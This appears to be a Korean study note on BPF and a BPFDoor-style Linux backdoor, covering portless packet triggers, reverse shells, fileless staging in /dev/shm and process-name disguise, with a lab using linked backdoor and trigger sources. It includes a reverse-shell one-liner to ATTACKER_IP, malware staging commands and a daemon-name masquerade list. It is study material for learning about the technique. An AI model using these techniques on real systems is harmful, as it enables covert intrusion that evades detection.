# 🛠️ BPF (Berkeley Packet Filter)

> **BPF**는 유저 모드 프로그램이 네트워크 필터에 어태치하여 소켓을 통해 들어오는 데이터를 허용하거나 거부할 수 있게 허용해 주는 기술이다. 즉 실행 중인 프로그램이 사용 중인 네트워크 소켓에 패킷 필터링 룰을 등록할 수 있으며 이를 통해 데이터를 읽거나 알림을 받을 수 있다.

1992년에 개발되어 패킷 필터로 패킷을 분석하고 필터링하는데에 사용되는 in-kernel virtual machine으로 BSD에서 처음으로 도입하였다. 네트워크 분석 도구 (예: tcpdump, wireshark)는 대량의 패킷 중에서 관심 있는 패킷만 빠르게 추출해야 합니다. 모든 패킷을 사용자 공간으로 가져와 필터링하면 성능이 매우 나빠집니다.

따라서 커널레벨에서 먼저 필터링 하고 필요한 패킷만 유저 공간으로 전달하는 BPF가 등장하였다


## 🔑 BPF Backdoor

BPF는 커널 네트워크 스택의 초기단계 socket이전에 필터링이 가능하다. 따라서 포트를 리슨하지 않아도 패킷을 가로채는것이 가능하다

따라서
* 리스닝 포트 없음: 외부에 노출되는 포트 없음
* Fileless: 디스크에 흔적을 남기지않음
* 커널수준에서 특정 패킷만 수신
* RC4 암호화 통신
* iptable 규칙 조작으로 포트 리다이렉션
* 시스템 데몬이름으로 프로세스 위장

### 🔧 특징
* 설치 위치: 리눅스 시스템 (일반적으로 백그라운드 프로세스)
* 동작 방식: eBPF로 패킷 검사 → 특정 시그니처가 들어오면 쉘 실행
* 기능: 명령어 실행, 역방향 쉘, 포트리스닝 없이 명령 수신
* 접근 방법: 비정상적인 TCP/UDP 패킷 이용, 포트 열지 않음
* 탐지 난이도: 매우 어렵다. 대부분의 보안 솔루션으로 탐지 불가

### 🔥 핵심 차별점

* 방화벽 우회: 방화벽이 열려있지 않아도 내부로 접근 가능
* 로그 미기록: 커널 레벨에서 수신 → 시스템 로그에 남지 않음
* 포트리스: 리스닝 포트 없이도 명령 수신 (정적 분석으로도 탐지 어려움)

----

## Reverse Shell

공격자가 피해자의 컴퓨터로 접속하는것이 아닌 피해자의 컴퓨터가 공격자의 컴퓨터에 접속하여 쉘을 제공하는 방식

아웃바운드 인바운드 보안을 우회

```css
[피해자 PC] ➝ 접속 ➝ [공격자 PC]
             쉘을 열어줌
```
### 🧱 2. 전통적 공격과의 차이점

| 방식    | 공격자 역할      | 피해자 역할        | 방화벽 우회 |
| ----- | ----------- | ------------- | ------ |
| 바인드 쉘 | 연결 요청       | 서버처럼 대기(bind) | 어렵다    |
| 리버스 쉘 | 리스너(Listen) | 클라이언트처럼 연결    | 쉬움 ✔️  |


* **Example**
    
1. 공격자
```bash
nc -lvnp 4444
```

2. 피해자

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 ==> localhost
```

## Memory based FS

리눅스 시스템에서 
```bash
/dev/shm
```
경로는 메모리 기반의 파일 시스템으로 주로 임시데이터 저장이나 처리에 사용된다 -> 디스크에 기록되지않고 메모리상에서만 운영되기에 자주 악용된다

```bash
/bin/rm -f /dev/shm/kdmtmpflush; # 파일이 존재하는 경우 지운다 -> 초기화 느낌
/bin/cp [악성코드] /dev/shm/kdmtmpflush && # 악성코드 바이너리 복사
/bin/chmod 755 /dev/shm/kdmtmpflush && # 파일 실행권한 설정
/dev/shm/kdmtmpflush –init kdmtmpflush && # 악성코드 실행

/bin/rm -f /dev/shm/kdmtmpflush # 원본은 지우기
```

**❓ 왜 `/dev/shm` 인가?**

1. 🧠 메모리 기반이라 흔적이 디스크에 남지 않음
    * /dev/shm은 RAM 기반 임시 파일시스템 (tmpfs)입니다.
    * 파일을 여기에 복사하고 실행하면, 디스크 I/O 없이 메모리에서 직접 실행됩니다.
    * 실행 후 삭제하면 디스크 포렌식, 로그 기반 탐지에 흔적을 남기지 않음.
2. 🕵️ 디스크 감시 탐지 우회 
    * /dev/shm은 일반적으로 덜 감시되므로, 여기에 복사하여 실행하면 탐지 확률이 줄어듦.


## 🪖 Camouflage

정신히 있는 관리자라면 가끔씩 어떤 프로세스들이 돌아가고 있는지 확인을 하긴 할 것이다. 따라서 해커들은 그럴듯한 이름을 통해 프로세스를 숨기고자 한다
이는 `prctl()` 함수를 통해 할 수 있다

```cpp
char *self[] = {
    "/sbin/udevd -d",
    "/sbin/mingetty /dev/tty7",
    "/usr/sbin/console-kit-daemon --no-daemon",
    "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event",
    "dbus-daemon --system",
    "hald-runner",
    "pickup -l -t fifo -u",
    "avahi-daemon: chroot helper",
    "/sbin/auditd -n",
    "/usr/lib/systemd/systemd-journald"
};
```

| 위장 문자열                     | 실제 용도           | 왜 위장할까?                |
| -------------------------- | --------------- | ---------------------- |
| `/sbin/udevd -d`           | Udev 장치 관리자     | 항상 실행되므로 눈에 띄지 않음      |
| `/sbin/mingetty /dev/tty7` | 터미널 로그인 데몬      | tty 단말 관련, 익숙한 이름      |
| `console-kit-daemon`       | 로그인/세션 관리 데몬    | GUI 시스템에서 흔함           |
| `dbus-daemon --system`     | IPC 메시지 버스 데몬   | 항상 실행됨                 |
| `hald-runner`              | HAL 하드웨어 추상화 데몬 | 요즘은 사용 안되지만 남아 있을 수 있음 |
| `auditd -n`                | 보안 감사 데몬        | 권한 있는 데몬, 의심 안 받음      |
| `systemd-journald`         | 시스템 로그 기록       | 완전한 핵심 프로세스처럼 보임       |


```cpp
#include <stdio.h>
#include <sys/prctl.h>
#include <string.h>

int main() {
    const char *new_name = "unsuspicious-name";
    
    if (prctl(PR_SET_NAME, (unsigned long)new_name, 0, 0, 0) == -1) {
        perror("prctl");
        return 1;
    }
    // pid 확인 (ps aux | grep '^roh')
    // 변경된 이름 확인 (ps -o comm -p <pid>)
    while(1) {
        sleep(10);
    }

    return 0;
}
```

----

## 🏃 실습

리눅스 머신에서 다음 두파일을 컴파일 [bpf](./light-bpf.c) [trigger](./light-trigger.c) 

쉘을 여러개 준비하고 공격자 역할을 할 쉘에서 `nc -lvnp 4444` 명령어를 사용해 리버스 쉘 연결을 대기한다

한 쉘에서는 관리자 권한으로 [bpf](./light-bpf.c) 실행 한쉘에서는 [trigger](./light-trigger.c) 트리거를 작동한다 이후 리버스 쉘 연결이 되는 모습을 확인할수 있다


## 💭 고찰

주기적으로 실행중인 프로세스를 점검해보자

아웃바운드 설정도 중요하다

그럼에도 털릴수있으니 중요 데이터는 암호화하자



----
Credits

[gwillgues](https://github.com/gwillgues/BPFDoor/)
[pjt3591oo](https://github.com/pjt3591oo/bpfdoor)